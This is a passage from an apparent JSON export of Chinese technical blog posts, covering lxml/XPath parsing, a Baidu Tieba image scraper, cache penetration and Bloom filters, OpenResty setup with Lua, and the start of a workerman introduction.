href=\"link5.html\"&gt;fifth item&lt;/a&gt; # 注意，此处缺少一个 &lt;/li&gt; 闭合标签\n     &lt;/ul&gt;\n &lt;/div&gt;\n'''\n\n#利用etree.HTML，将字符串解析为HTML文档\nhtml = etree.HTML(text) \n\n# 按字符串序列化HTML文档\nresult = etree.tostring(html) \n\nprint(result)\n</code></pre>\n\n<p>输出结果：</p>\n\n<pre class=\"has\">\n<code>&lt;html&gt;&lt;body&gt;\n&lt;div&gt;\n    &lt;ul&gt;\n         &lt;li class=\"item-0\"&gt;&lt;a href=\"link1.html\"&gt;first item&lt;/a&gt;&lt;/li&gt;\n         &lt;li class=\"item-1\"&gt;&lt;a href=\"link2.html\"&gt;second item&lt;/a&gt;&lt;/li&gt;\n         &lt;li class=\"item-inactive\"&gt;&lt;a href=\"link3.html\"&gt;third item&lt;/a&gt;&lt;/li&gt;\n         &lt;li class=\"item-1\"&gt;&lt;a href=\"link4.html\"&gt;fourth item&lt;/a&gt;&lt;/li&gt;\n         &lt;li class=\"item-0\"&gt;&lt;a href=\"link5.html\"&gt;fifth item&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n &lt;/div&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre>\n\n<p>lxml 可以自动修正 html 代码，例子里不仅补全了 li 标签，还添加了 body，html 标签。</p>\n\n<h3 id=\"文件读取：\">文件读取：</h3>\n\n<p>除了直接读取字符串，lxml还支持从文件里读取内容。我们新建一个hello.html文件：</p>\n\n<pre class=\"has\">\n<code>&lt;!-- hello.html --&gt;\n\n&lt;div&gt;\n    &lt;ul&gt;\n         &lt;li class=\"item-0\"&gt;&lt;a href=\"link1.html\"&gt;first item&lt;/a&gt;&lt;/li&gt;\n         &lt;li class=\"item-1\"&gt;&lt;a href=\"link2.html\"&gt;second item&lt;/a&gt;&lt;/li&gt;\n         &lt;li class=\"item-inactive\"&gt;&lt;a href=\"link3.html\"&gt;&lt;span class=\"bold\"&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;\n         &lt;li class=\"item-1\"&gt;&lt;a href=\"link4.html\"&gt;fourth item&lt;/a&gt;&lt;/li&gt;\n         &lt;li class=\"item-0\"&gt;&lt;a href=\"link5.html\"&gt;fifth item&lt;/a&gt;&lt;/li&gt;\n     &lt;/ul&gt;\n &lt;/div&gt;\n</code></pre>\n\n<p>再利用 etree.parse() 方法来读取文件。</p>\n\n<pre class=\"has\">\n<code># lxml_parse.py\n\nfrom lxml import etree\n\n# 读取外部文件 hello.html\nhtml = etree.parse('./hello.html')\nresult = etree.tostring(html, pretty_print=True)\n\nprint(result)\n</code></pre>\n\n<p>输出结果与之前相同：</p>\n\n<pre class=\"has\">\n<code>&lt;html&gt;&lt;body&gt;\n&lt;div&gt;\n    &lt;ul&gt;\n         &lt;li class=\"item-0\"&gt;&lt;a href=\"link1.html\"&gt;first item&lt;/a&gt;&lt;/li&gt;\n         &lt;li class=\"item-1\"&gt;&lt;a href=\"link2.html\"&gt;second item&lt;/a&gt;&lt;/li&gt;\n         &lt;li class=\"item-inactive\"&gt;&lt;a href=\"link3.html\"&gt;third item&lt;/a&gt;&lt;/li&gt;\n         &lt;li class=\"item-1\"&gt;&lt;a href=\"link4.html\"&gt;fourth item&lt;/a&gt;&lt;/li&gt;\n         &lt;li class=\"item-0\"&gt;&lt;a href=\"link5.html\"&gt;fifth item&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n &lt;/div&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre>\n\n<h3 id=\"xpath实例测试\">XPath实例测试</h3>\n\n<p>1. 获取所有的 <code>&lt;li&gt;</code> 标签</p>\n\n<pre class=\"has\">\n<code># xpath_li.py\n\nfrom lxml import etree\n\nhtml = etree.parse('hello.html')\nprint type(html)  # 显示etree.parse() 返回类型\n\nresult = html.xpath('//li')\n\nprint result  # 打印&lt;li&gt;标签的元素集合\nprint len(result)\nprint type(result)\nprint type(result[0])\n</code></pre>\n\n<p>输出结果：</p>\n\n<pre class=\"has\">\n<code>&lt;type 'lxml.etree._ElementTree'&gt;\n[&lt;Element li at 0x1014e0e18&gt;, &lt;Element li at 0x1014e0ef0&gt;, &lt;Element li at 0x1014e0f38&gt;, &lt;Element li at 0x1014e0f80&gt;, &lt;Element li at 0x1014e0fc8&gt;]\n5\n&lt;type 'list'&gt;\n&lt;type 'lxml.etree._Element'&gt;\n</code></pre>\n\n<p>2. 继续获取<code>&lt;li&gt;</code> 标签的所有 <code>class</code>属性</p>\n\n<pre class=\"has\">\n<code># xpath_li.py\n\nfrom lxml import etree\n\nhtml = etree.parse('hello.html')\nresult = html.xpath('//li/@class')\n\nprint result\n</code></pre>\n\n<p>运行结果</p>\n\n<pre class=\"has\">\n<code>['item-0', 'item-1', 'item-inactive', 'item-1', 'item-0']\n</code></pre>\n\n<p>3. 继续获取<code>&lt;li&gt;</code>标签下<code>hre</code> 为 <code>link1.html</code> 的 <code>&lt;a&gt;</code> 标签</p>\n\n<pre class=\"has\">\n<code># xpath_li.py\n\nfrom lxml import etree\n\nhtml = etree.parse('hello.html')\nresult = html.xpath('//li/a[@href=\"link1.html\"]')\n\nprint result\n</code></pre>\n\n<p>运行结果</p>\n\n<pre class=\"has\">\n<code>[&lt;Element a at 0x10ffaae18&gt;]\n</code></pre>\n\n<p>4. 获取<code>&lt;li&gt;</code> 标签下的所有 <code>&lt;span&gt;</code> 标签</p>\n\n<pre class=\"has\">\n<code># xpath_li.py\n\nfrom lxml import etree\n\nhtml = etree.parse('hello.html')\n\n#result = html.xpath('//li/span')\n#注意这么写是不对的：\n#因为 / 是用来获取子元素的，而 &lt;span&gt; 并不是 &lt;li&gt; 的子元素，所以，要用双斜杠\n\nresult = html.xpath('//li//span')\n\nprint result\n</code></pre>\n\n<p>运行结果</p>\n\n<pre class=\"has\">\n<code>[&lt;Element span at 0x10d698e18&gt;]\n</code></pre>\n\n<p>5. 获取 <code>&lt;li&gt;</code> 标签下的<code>&lt;a&gt;</code>标签里的所有 class</p>\n\n<pre class=\"has\">\n<code># xpath_li.py\n\nfrom lxml import etree\n\nhtml = etree.parse('hello.html')\nresult = html.xpath('//li/a//@class')\n\nprint result\n</code></pre>\n\n<p>运行结果</p>\n\n<pre class=\"has\">\n<code>['blod']\n</code></pre>\n\n<p>6. 获取最后一个 <code>&lt;li&gt;</code> 的 <code>&lt;a&gt;</code> 的 href</p>\n\n<pre class=\"has\">\n<code># xpath_li.py\n\nfrom lxml import etree\n\nhtml = etree.parse('hello.html')\n\nresult = html.xpath('//li[last()]/a/@href')\n# 谓语 [last()] 可以找到最后一个元素\n\nprint result\n</code></pre>\n\n<p>运行结果</p>\n\n<pre class=\"has\">\n<code>['link5.html']\n</code></pre>\n\n<p>7. 获取倒数第二个元素的内容</p>\n\n<pre class=\"has\">\n<code># xpath_li.py\n\nfrom lxml import etree\n\nhtml = etree.parse('hello.html')\nresult = html.xpath('//li[last()-1]/a')\n\n# text 方法可以获取元素内容\nprint result[0].text\n</code></pre>\n\n<p>运行结果</p>\n\n<pre class=\"has\">\n<code>fourth item\n</code></pre>\n\n<p>8. 获取 <code>class</code> 值为 <code>bold</code> 的标签名</p>\n\n<pre class=\"has\">\n<code># xpath_li.py\n\nfrom lxml import etree\n\nhtml = etree.parse('hello.html')\n\nresult = html.xpath('//*[@class=\"bold\"]')\n\n# tag方法可以获取标签名\nprint result[0].tag\n</code></pre>\n\n<p>运行结果</p>\n\n<pre class=\"has\">\n<code>span</code></pre>\n                                    </div>", "log_PostTime": 1584891196, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python案例：使用XPath的爬虫", "log_Intro": "Python案例：使用XPath的爬虫", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"案例：使用xpath的爬虫\">案例：使用XPath的爬虫</h1>\n\n<p>现在我们用XPath来做一个简单的爬虫，我们尝试爬取某个贴吧里的所有帖子，并且将该这个帖子里每个楼层发布的图片下载到本地。</p>\n\n<pre class=\"has\">\n<code># tieba_xpath.py\n\n\n#!/usr/bin/env python\n# -*- coding:utf-8 -*-\n\nimport os\nimport urllib\nimport urllib2\nfrom lxml import etree\n\nclass Spider:\n    def __init__(self):\n        self.tiebaName = raw_input(\"请需要访问的贴吧：\")\n        self.beginPage = int(raw_input(\"请输入起始页：\"))\n        self.endPage = int(raw_input(\"请输入终止页：\"))\n\n        self.url = 'http://tieba.baidu.com/f'\n        self.ua_header = {\"User-Agent\" : \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1 Trident/5.0;\"}\n\n        # 图片编号\n        self.userName = 1\n\n    def tiebaSpider(self):\n        for page in range(self.beginPage, self.endPage + 1):\n            pn = (page - 1) * 50 # page number\n            word = {'pn' : pn, 'kw': self.tiebaName}\n\n            word = urllib.urlencode(word) #转换成url编码格式（字符串）\n            myUrl = self.url + \"?\" + word\n\n            # 示例：http://tieba.baidu.com/f? kw=%E7%BE%8E%E5%A5%B3 &amp; pn=50\n            # 调用 页面处理函数 load_Page\n            # 并且获取页面所有帖子链接,\n            links = self.loadPage(myUrl)  # urllib2_test3.py\n\n    # 读取页面内容\n    def loadPage(self, url):\n        req = urllib2.Request(url, headers = self.ua_header)\n        html = urllib2.urlopen(req).read()\n\n        # 解析html 为 HTML 文档\n        selector=etree.HTML(html)\n\n        #抓取当前页面的所有帖子的url的后半部分，也就是帖子编号\n        # http://tieba.baidu.com/p/4884069807里的 “p/4884069807”\n        links = selector.xpath('//div[@class=\"threadlist_lz clearfix\"]/div/a/@href')\n\n        # links 类型为 etreeElementString 列表\n        # 遍历列表，并且合并成一个帖子地址，调用 图片处理函数 loadImage\n        for link in links:\n            link = \"http://tieba.baidu.com\" + link\n            self.loadImages(link)\n\n    # 获取图片\n    def loadImages(self, link):\n        req = urllib2.Request(link, headers = self.ua_header)\n        html = urllib2.urlopen(req).read()\n\n        selector = etree.HTML(html)\n\n        # 获取这个帖子里所有图片的src路径\n        imagesLinks = selector.xpath('//img[@class=\"BDE_Image\"]/@src')\n\n        # 依次取出图片路径，下载保存\n        for imagesLink in imagesLinks:\n            self.writeImages(imagesLink)\n\n    # 保存页面内容\n    def writeImages(self, imagesLink):\n        '''\n            将 images 里的二进制内容存入到 userNname 文件中\n        '''\n\n        print imagesLink\n        print \"正在存储文件 %d ...\" % self.userName\n        # 1. 打开文件，返回一个文件对象\n        file = open('./images/' + str(self.userName)  + '.png', 'wb')\n\n        # 2. 获取图片里的内容\n        images = urllib2.urlopen(imagesLink).read()\n\n        # 3. 调用文件对象write() 方法，将page_html的内容写入到文件里\n        file.write(images)\n\n        # 4. 最后关闭文件\n        file.close()\n\n        # 计数器自增1\n        self.userName += 1\n\n# 模拟 main 函数\nif __name__ == \"__main__\":\n\n    # 首先创建爬虫对象\n    mySpider = Spider()\n    # 调用爬虫对象的方法，开始工作\n    mySpider.tiebaSpider()\n</code></pre>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191025160256923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891197, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "常见缓存架构原理", "log_Intro": "常见缓存架构原理", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>互联网公司在缓存架构上是区分很大的,往往是根据企业的业务量来进行选择的,可以看如下图</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTU1OTAzNi8yMDE5MDQvMTU1OTAzNi0yMDE5MDQwMjEyNTIwNTY3OS03MTc2NjM5MDUucG5n?x-oss-process=image/format,png\"></p>\n\n<p>在传统的小型互联网公司,采用网页静态化技术,freemarker来加快用户的体验速度,从来来提升响应,但是如果出现了缓存血崩,缓存击穿那么对数据库将会造成很大的压力,可能导致整个架构无法使用</p>\n\n<h3><strong>一 缓存击穿</strong></h3>\n\n<p>  　　缓存穿透是指查询一个一定不存在的数据，由于缓存是不命中时需要从数据库查询，查不到数据则不写入缓存，这将导致这个不存在的数据每次请求都要到数据库去查询，造成缓存穿透,即使使用的es数据库,那么当大量数据进来之后还是对内容数据库压力造成很多问题</p>\n\n<p><strong>解决方案:</strong></p>\n\n<p>1.布隆过滤</p>\n\n<p>  对所有可能查询的参数以hash形式存储，在控制层先进行校验，不符合则丢弃。还有最常见的则是采用布隆过滤器，将所有可能存在的数据哈希到一个足够大的bitmap中，一个一定不存在的数据会被这个bitmap拦截掉，从而避免了对底层存储系统的查询压力。</p>\n\n<p> <strong> 补充:</strong></p>\n\n<p>      Bloom filter</p>\n\n<p>  适用范围：可以用来实现数据字典，进行数据的判重，或者集合求交集</p>\n\n<p>  基本原理及要点：对于原理来说很简单，位数组+k个独立hash函数。将hash函数对应的值的位数组置1，查找时如果发现所有hash函数对应位都是1说明存在，很明显这个过程并不保证查找的结果是100%正确的。同时也不支持删除一个已经插入的关键字，因为该关键字对应的位会牵动到其他的关键字。所以一个简单的改进就是counting Bloom filter，</p>                                    </div>", "log_PostTime": 1584891198, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "OpenResty搭建高性能服务端", "log_Intro": "OpenResty搭建高性能服务端", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2>Socket编程</h2>\n\n<p>Linux Socket编程领域为了处理大量连接请求场景，需要使用非阻塞I/O和复用，<code>select</code>、<code>poll</code>、<code>epoll</code>是Linux API提供的I/O复用方式，自从Linux2.6中加入了epoll之后，高性能服务器领域得到广泛的应用，Nignx就是使用<code>epoll</code>来实现I/O复用支持高并发。</p>\n\n<p>对于“高性能”服务端而言，我们所关注的并不是语言的性能，而是缓存和语言支持异步非阻塞。</p>\n\n<p>缓存</p>\n\n<p>针对缓存要明白通信速度的快慢顺序</p>\n\n<ul><li>内存&gt;SSD&gt;机械磁盘</li>\n\t<li>本机&gt;网络</li>\n\t<li>进程内 &gt; 进程间</li>\n</ul><p>缓存系统的目标是希望在进程内的命中率是最高的，那么此时缓存系统整体的效率也是最高的。</p>\n\n<p>异步非阻塞</p>\n\n<p>希望访问数据库、访问网络，访问一些比较慢的IO设备时，不要在等待上耗费大量时间。而是使用事件驱动的方式，当系统完成某项任务后再来通知我们。这样就可以将服务器CPU的空闲资源，用来服务客户端连接。</p>\n\n<h2>OpenResty</h2>\n\n<p>OpenResty是基于Ngnix和Lua的高性能web平台，内部集成精良的LUa库、第三方模块、依赖项。用于方便搭建能够处理高并发、扩展性极高的动态web应用、web服务、动态网关。可以使用Lua脚本调用Ngnix支持的C以及Lua模块，快速构建10K～1000K单机并发连接的高性能web应用系统。OpenResty的目标是让web服务直接运行在Nginx服务内部，利用Ngnix的非阻塞IO模型，对HTTP客户端请求和后端DB进行一致的高性能响应。</p>\n\n<p>OpenResty的出现可以说是颠覆了高性能服务端的开发模式。OpenResty实际上是Nginx+LuaJIT的完美组合。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy80OTMzNzAxLWYyMzI3NjhmZDYxYjQ4N2IucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvNTI0L2Zvcm1hdC93ZWJw?x-oss-process=image/format,png\"></p>\n\n<p>OpenResty工作方式</p>\n\n<p>由于Nginx采用的是<code>master-worker</code>模型，也就是一个<code>master</code>主进程管理多个<code>worker</code>进程，基本的事件处理都是放在<code>worker</code>中，<code>master</code>仅负责一些全剧初始化，以及对<code>worker</code>的管理。在OpenResty中，每个<code>worker</code>使用一个LuaVM，每个请求被分配到<code>worker</code>时，将在这个<code>LuaVM</code>中创建一个<code>coroutine</code>协程。协程之间数据隔离，每个协程具有独立的全局变量<code>_G</code>。</p>\n\n<p>Lua中的协程和多线程下的线程类似，都有自己的堆栈、局部变量、指令指针...，但是和其他协程程序共享全局变量等信息。线程和协程主要不同在于：多处理器的情况下，概念上来说多线程是同时运行多个线程，而协程是通过代码来完成协程的切换，任何时刻只有一个协程程序在运行。并且这个在运行的协程只有明确被要求挂起时才会被挂起。</p>\n\n<p>根据实际测试，OpenResty性能接近于Nginx 性能之王c module，甚至超过。</p>\n\n<h2>OpenResty 架构</h2>\n\n<ul><li>负载均衡</li>\n</ul><p>LVS+HAProxy将流量转发给核心Nginx1和Nginx2，即实现了流量的负载均衡。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy80OTMzNzAxLWVhZmU0Zjc1ZTQzOGI1OTEucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvODU4L2Zvcm1hdC93ZWJw?x-oss-process=image/format,png\"></p>\n\n<p>负载均衡</p>\n\n<ul><li>单机闭环</li>\n</ul><p>所有想要的数据都能从本服务器直接获取，大多数时候无需通过网络或去其他服务器获取。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy80OTMzNzAxLTcyZDJjMzFhY2EwNzA3NzgucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvODQxL2Zvcm1hdC93ZWJw?x-oss-process=image/format,png\"></p>\n\n<p>单机闭环</p>\n\n<ul><li>分布式闭环</li>\n</ul><p>单机闭环会遇到2个主要问题</p>\n\n<ol><li>\n\t<p>数据不一致<br>\n\t例如没有主从架构导致不同服务器数据不一致</p>\n\t</li>\n\t<li>\n\t<p>遇到存储瓶颈<br>\n\t磁盘或内存遇到天花板</p>\n\t</li>\n</ol><p>解决数据不一致比较好的办法是采用主从或分布式集中存储，而遇到存储瓶颈就需要进行按业务键进行分片，将数据分散到多台服务器。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy80OTMzNzAxLWViNjI3OGJmMDg5ZGM4Y2YucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvODY0L2Zvcm1hdC93ZWJw?x-oss-process=image/format,png\"></p>\n\n<p>分布式闭环</p>\n\n<ul><li>接入网关</li>\n</ul><p>接入网关又叫接入层，即接收流量的入口，在入口处做如下事情：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy80OTMzNzAxLThkYmZlM2E1NjhlOTVmMGIucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvODM3L2Zvcm1hdC93ZWJw?x-oss-process=image/format,png\"></p>\n\n<p>接入网关</p>\n\n<h2>OpenResty环境搭建</h2>\n\n<ul><li><a href=\"http://openresty.org\" rel=\"nofollow\">http://openresty.org</a></li>\n\t<li><a href=\"http://openresty.org/cn/download.html\" rel=\"nofollow\">http://openresty.org/cn/download.html</a></li>\n</ul><p>安装前准备，必须安装<code>perl</code>、<code>libpcre</code>、<code>libssl</code>库。</p>\n\n<pre class=\"has\">\n<code># 从系统路径中查看必备库是否已经安装\n$ sudo ldconfig -v\n\n# 安装必备库\n$ sudo apt install libpcre3-dev libssl-dev perl make build-essential curl libreadline-dev libncurses5-dev\n</code></pre>\n\n<p>下载并解压OpenResty后进入其目录</p>\n\n<pre class=\"has\">\n<code>$ wget https://openresty.org/download/ngx_openresty-1.13.6.1.tar.gz\n$ tar -zxvf ngx_openresty-1.13.6.1.tar.gz\n$ mv openresty-1.13.6.1 openresty\n$ cd openresty\n$ ./configure\n</code></pre>\n\n<p>默认会被安装到<code>/usr/local/openresty</code>目录下</p>\n\n<pre class=\"has\">\n<code># 编译并安装\n$ sudo make &amp;&amp; make install\n$ cd /usr/local/openresty\n</code></pre>\n\n<p>启动Nginx</p>\n\n<pre class=\"has\">\n<code>$ sudo /usr/local/openresty/nginx/sbin/nginx\n$ ps -ef | grep nginx\n$ service nginx status\n</code></pre>\n\n<p>Nginx启动若出现</p>\n\n<pre class=\"has\">\n<code>nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use)\nnginx: [emerg] still could not bind()\n</code></pre>\n\n<p>说明80端口并占用，查看80端口被占用的端口并重启。原因在于nginx先监听了ipv4的80端口之后又监听了ipv6的80端口，于是就重复占用了。</p>\n\n<pre class=\"has\">\n<code>$ sudo netstat -ntlp | grep 80\n$ sudo killall -9 nginx\n</code></pre>\n\n<p>重新编辑Nginx配置文件</p>\n\n<pre class=\"has\">\n<code>$ sudo vim /etc/nginx/conf/nginx.conf\n\nlisten 80;\nlisten [::]:80 ipv6only=on default_server;\n</code></pre>\n\n<p>使用<code>curl</code>工具或在浏览器访问默认80端口</p>\n\n<pre class=\"has\">\n<code>$ curl 127.0.0.1\n</code></pre>\n\n<p>浏览器输入<code>http://127.0.0.1/</code></p>\n\n<p>将Nginx工具配置到当前用户的系统环境变量中</p>\n\n<pre class=\"has\">\n<code>$ sudo vim ~/.bashrc\nexport PATH=$PATH:/usr/local/openresty/nginx/sbin\n$ source ~./bashrc\n$ cd ~\n$ nginx -s reload\nnginx: [alert] kill(12267, 1) failed (1: Operation not permitted)\n</code></pre>\n\n<p>开发文档</p>\n\n<ul><li><a href=\"https://www.nginx.com/resources/wiki/modules/lua/\" rel=\"nofollow\">https://www.nginx.com/resources/wiki/modules/lua/</a></li>\n</ul><p>ubuntu 安装 vcode 或 sublime text 编辑器</p>\n\n<p>content_by_lua</p>\n\n<pre class=\"has\">\n<code>$ vim /usr/local/openresty/nginx/conf/nginx.conf\nlocation /test {\n  default_type text/html;\n  content_by_lua 'ngx.say(\"hello openresty\")';\n}\n\n# 重启Nginx\n$ /usr/local/openresty/nginx/sbin/nginx -s reload\n\n# 浏览器访问 127.0.0.1/test\n</code></pre>\n\n<p>content_by_lua_file</p>\n\n<pre class=\"has\">\n<code>$ vim nginx.conf\nlocation /test {\n  content_by_lua_file 'html/test.lua';\n}\n$ vim ../html/test.lua\nngx.say(\"hello lua\")\n$ sudo /usr/local/nginx/sbin/nginx -s reload\n$ curl 127.0.0.1/test\nhello lua\n</code></pre>\n\n<p>为避免每次修改都需要重启Nginx，可在Nginx的<code>server</code>选项中配置<code>lua_code_cache</code>选项。</p>\n\n<pre class=\"has\">\n<code>$ vim nginx.conf\nserver{\n  lua_code_cache off;\n  location /test{\n    content_by_lua_file 'html/test.lua';\n  }\n}\n$ sudo /usr/local/openresty/nginx/sbin/nginx -s reload\nnginx: [alert] lua_code_cache is off; this will hurt performance in /usr/local/openresty/nginx/conf/nginx.conf:48\n</code></pre>\n\n<p>注意<code>lua_code_cache off;</code>是会引擎Nginx的性能的，在生产环境中是需要将其开启的。</p>\n\n<p>小节</p>\n\n<p>在OpenResty中开发是分为两步的，第一步是修改Nginx配置，第二步是使用Lua开发自己的脚本。</p>\n\n<h2>OpenResty入门</h2>\n\n<p>参考资料</p>\n\n<ul><li><a href=\"https://moonbingbing.gitbooks.io/openresty-best-practices/content/\" rel=\"nofollow\">OpenResty最佳实践</a></li>\n\t<li><a href=\"https://www.nginx.com/resources/wiki/modules/lua/\" rel=\"nofollow\">Nginx Lua</a></li>\n</ul><p>创建工作目录</p>\n\n<p>OpenResty安装之后就有配置文件及相关目录，为了工作目录和安装目录互不干扰，另外创建OpenResty工作目录，并另写配置。</p>\n\n<pre class=\"has\">\n<code>$ mkdir -p ~/openresty/test/logs ~/openresty/test/conf\n$ vim ~/openresty/test/conf/nginx.conf\n# 设置Nginx worker工作进程数量，即CPU核数。\nworker_processes 1;\n\n# 设置错误日志文件路径\nerror_log logs/error.log;\n# 配置Nginx服务器与用户的网络连接\nevents{\n    # 设置每个工作进程的最大连接数\n    worker_connections 10224;\n}\n\nhttp{\n    # 虚拟机主机块定义\n    server{\n        # 监听端口\n        listen 8001;\n        # 配置请求的路由\n        location /{\n            default_type text/html;\n            content_by_lua_block{\n                ngx.say(\"hello world\");\n            }\n        }\n    }\n}\n$ nginx -p ~/openresty/test\n$ curl 127.0.0.1:8001\nhello world\n</code></pre>\n\n<pre class=\"has\">\n<code>$ vim nginx.conf\nlocation /test{\n  content_by_lua_file \"lua/test.lua\";\n}\n$ cd .. &amp;&amp; mkdir lua &amp;&amp; cd lua\n$ vim test.lua\nlocal args = ngx.req.get_uri_args()\nlocal salt = args.salt\nif not salt then\n  ngx.exit(ngx.HTTP_BAD_REQUEST)\nend\nlocal md5str = ngx.md5(ngx.time()..salt)\nngx.say(md5str)\n\n$ sudo /usr/local/openresty/nginx/sbin/nginx -s reload\n$ curl -i 127.0.0.1/test?salt=lua\nHTTP/1.1 200 OK\nServer: openresty/1.13.6.2\nDate: Sun, 27 Jan 2019 10:07:17 GMT\nContent-Type: application/octet-stream\nTransfer-Encoding: chunked\nConnection: keep-alive\n\nb55b77f75e46b96b11778ca7edfe8d55\n</code></pre>\n\n<p>若代码中出现错误则需要直接查看Nginx的错误日志进行查看</p>\n\n<pre class=\"has\">\n<code>$ vim nginx/logs/error.log\n2019/01/27 17:37:15 [error] 15764#0: *6 failed to load external Lua file \"/usr/local/openresty/nginx/test.lua\": cannot open /usr/local/openresty/nginx/test.lua: No such file or...\n</code></pre>\n\n<p>Windows系统下查看Nginx进程</p>\n\n<pre class=\"has\">\n<code>λ tasklist /fi \"imagename eq nginx.exe\"\n\n映像名称                       PID 会话名              会话#       内存使用\n========================= ======== ================ =========== ============\nnginx.exe                     9072 Console                    1      7,840 K\nnginx.exe                     7692 Console                    1     12,304 K\nnginx.exe                     8120 Console                    1      7,840 K\nnginx.exe                     4552 Console                    1     12,188 K\nnginx.exe                     9588 Console                    1      7,828 K\nnginx.exe                     6256 Console                    1     12,216 K\nnginx.exe                     7308 Console                    1      7,828 K\nnginx.exe                    10192 Console                    1     12,212 K\n\nλ taskkill /im nginx.exe /f\n成功: 已终止进程 \"nginx.exe\"，其 PID 为 9072。\n</code></pre>\n\n<h2>ngx lua API</h2>\n\n<p>参考资料</p>\n\n<ul><li><a href=\"https://www.nginx.com/resources/wiki/modules/lua/#nginx-api-for-lua\" rel=\"nofollow\">NGINX API for Lua</a></li>\n</ul><p><br><br>\n作者：JunChow520<br>\n链接：<a href=\"https://www.jianshu.com/p/09c17230e1ae\" rel=\"nofollow\">https://www.jianshu.com/p/09c17230e1ae</a><br>\n来源：简书<br>\n著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>\n                                    </div>", "log_PostTime": 1584891200, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "workerman的基本用法", "log_Intro": "workerman的基本用法", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcucGhwLmNuL3VwbG9hZC9hcnRpY2xlLzAwMC8wMDAvMDIwLzVjOTFhMmY5ZGMwZWM0NjMuanBn?x-oss-process=image/format,png\"></strong></p>\n\n<p><strong>workerman是什么？</strong></p>\n\n<p>Workerman是一个异步事件驱动的<strong>PHP框架</strong>，具有高性能，可轻松构建快速，可扩展的网络应用程序。支持HTTP，Websocket，SSL和其他自定义协议。支持libevent，<a href=\"https://github.com/facebook/hhvm\">HHVM</a>，<a href=\"https://github.com/reactphp/react\">ReactPHP</a>。</p>\n\n<p><strong>要求</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>PHP 5.3或更高版本</code></p>\n\n\t\t\t<p><code>兼容POSIX的操作系统（Linux，OSX，BSD）</code></p>\n\n\t\t\t<p><code>用于PHP的POSIX和PCNTL扩展</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>安装</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>composer </code><code>require</code> <code>workerman/workerman</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>基本用法</strong></p>\n\n<p><strong>websocket服务器</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" 